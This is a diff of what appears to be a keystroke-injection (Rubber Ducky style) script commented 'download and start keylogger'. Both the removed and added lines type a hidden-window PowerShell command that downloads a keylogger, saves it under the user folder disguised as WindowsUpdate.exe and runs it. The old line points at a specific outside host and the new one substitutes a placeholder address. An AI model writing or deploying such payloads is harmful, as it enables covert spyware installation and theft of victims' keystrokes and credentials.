@@ -16,7 +16,7 @@ REM download and start keylogger
 DELAY 1000
 GUI r 
 DELAY 800
-STRING PowerShell.exe "PowerShell.exe -windowstyle hidden {$thePath = 'c:\Users\'+$env:UserName+'\WindowsUpdate.exe'; Invoke-WebRequest -Uri 'https://schmitz-server.de/Downloads/Keylogger.exe' -OutFile $thePath; Start-Process $thePath}"
+STRING PowerShell.exe "PowerShell.exe -windowstyle hidden {$thePath = 'c:\Users\'+$env:UserName+'\WindowsUpdate.exe'; Invoke-WebRequest -Uri '"Address of Keylogger exe"' -OutFile $thePath; Start-Process $thePath}"
 CTRL SHIFT ENTER
 DELAY 800
 LEFT
